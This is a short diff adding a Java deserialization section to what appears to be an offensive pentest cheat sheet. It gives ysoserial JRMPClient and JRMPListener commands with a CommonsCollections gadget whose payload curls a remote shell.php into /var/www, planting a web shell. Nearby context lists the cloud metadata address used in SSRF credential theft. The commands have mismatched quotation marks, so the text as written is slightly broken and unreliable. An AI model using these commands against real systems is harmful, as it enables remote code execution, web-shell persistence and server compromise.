@@ -412,7 +412,13 @@ echo "-----------------Loading-----------------\n\n"; done < payloads.txt
 #### Good Sign
 
 -> java.io.IOException
+  
+### JRMPClient and JRMPListener (CommonsCollections)
+  
+java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
 
+java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections “curl http://ip:port/shell.php -o /var/www/shell.php”
+  
 ## Cloud
 
 http://169.254.169.254/latest/meta-data
